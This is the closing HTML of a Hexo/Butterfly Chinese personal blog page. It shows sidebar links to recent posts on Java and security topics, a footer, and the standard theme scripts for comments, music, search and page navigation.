href="/2023/02/23/Java-Thread%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/" title="Java Thread类使用方法和注意事项"><img src="https://www.apple.com.cn/newsroom/images/live-action/wwdc-2021/Apple_Developer-Tools-hero-animation-clip_060721.jpg.landing-regular_2x.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java Thread类使用方法和注意事项"/></a><div class="content"><a class="title" href="/2023/02/23/Java-Thread%E7%B1%BB%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%92%8C%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/" title="Java Thread类使用方法和注意事项">Java Thread类使用方法和注意事项</a><time datetime="2023-02-22T16:08:30.000Z" title="发表于 2023-02-23 00:08:30">2023-02-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/25/Java%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81-%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5/" title="Java安全编码-用户输入"><img src="https://www.apple.com.cn/newsroom/images/live-action/wwdc-2021/Apple_Developer-Tools-hero-animation-clip_060721.jpg.landing-regular_2x.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java安全编码-用户输入"/></a><div class="content"><a class="title" href="/2023/01/25/Java%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81-%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5/" title="Java安全编码-用户输入">Java安全编码-用户输入</a><time datetime="2023-01-24T16:38:06.000Z" title="发表于 2023-01-25 00:38:06">2023-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/23/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E5%8F%8A%E5%88%86%E6%9E%90/" title="Nginx解析漏洞深入利用及分析"><img src="https://www.apple.com.cn/newsroom/images/passions/education/Apple-STEAM-Day-hero_Full-Bleed-Image.jpg.large_2x.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx解析漏洞深入利用及分析"/></a><div class="content"><a class="title" href="/2023/01/23/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8%E5%8F%8A%E5%88%86%E6%9E%90/" title="Nginx解析漏洞深入利用及分析">Nginx解析漏洞深入利用及分析</a><time datetime="2023-01-23T15:28:26.000Z" title="发表于 2023-01-23 23:28:26">2023-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/04/Chrome-V8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-1310/" title="Chrome V8命令执行漏洞分析（CVE-2022-1310）"><img src="https://www.apple.com.cn/newsroom/images/values/corporate/standard/Apple_google-partner-on-covid-19-contact-tracing-technology_04102020_inline.jpg.large_2x.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chrome V8命令执行漏洞分析（CVE-2022-1310）"/></a><div class="content"><a class="title" href="/2022/09/04/Chrome-V8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-1310/" title="Chrome V8命令执行漏洞分析（CVE-2022-1310）">Chrome V8命令执行漏洞分析（CVE-2022-1310）</a><time datetime="2022-09-04T12:01:52.000Z" title="发表于 2022-09-04 20:01:52">2022-09-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/07/20/tOoYKRE7fMVdb6x.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Small Waste</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://apple.com">Developer</a><span class="footer-separator">|</span><span>主题 </span><a href="">ADD</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://www.xiaojingye.top/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
+  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
+  if ($mermaidWrap.length) {
+    window.runMermaid = () => {
+      window.loadMermaid = true
+      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+      Array.from($mermaidWrap).forEach((item, index) => {
+        const mermaidSrc = item.firstElementChild
+        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
+        const mermaidID = 'mermaid-' + index
+        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
+          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
+        })
+      })
+    }
+
+    const loadMermaid = () => {
+      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
+    }
+
+    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+  }
+})()</script><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://xiaojingye.zeabur.app',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://xiaojingye.zeabur.app',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !true) {
+    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="8556824432" data-server="tencent" data-type="playlist" data-fixed="true" data-autoplay="false" data-lrcType="-1"> </div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="富强,民主,文明,和谐,自由,平等,公正,法制,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/issues.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>
